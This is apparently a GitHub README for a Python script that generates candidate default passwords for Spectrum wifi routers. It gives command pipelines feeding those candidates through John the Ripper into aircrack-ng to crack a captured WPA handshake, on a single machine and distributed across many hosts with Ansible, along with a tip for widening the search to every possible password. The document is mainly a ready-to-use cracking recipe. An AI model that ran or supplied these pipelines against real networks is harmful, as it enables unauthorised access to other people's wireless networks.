# Spectrum_wifi
Script to generate password possibilities for Spectrum's wifi routers

Example default password:
```
building-hiding1-cart
```


Example running on single system:
```
time python3 spectrum-wifi.py --run | john --stdin --session=attack8 --stdout |aircrack-ng ./cap/Spectrum_Startup.cap -e SpectrumStartup
M7 -w - -q
```

Example running on multiple systems, with same collision logic instead of complete wordlist logic:
```
ansible all -i hosts/ -a "time python3 spectrum-wifi.py --run | john --stdin --session=attack8 --stdout |aircrack-ng /share/cap/Spectrum_Startup.cap -e SpectrumStartup
M7 -w - -q" -u ansible -b --become-password-file /share/becomepass
```

To change the logic to add all plausibilities, change the random.randrange and make that a for each in range loop. 

Use of john's session tracking helps us return to our spot if it gets interrupted.

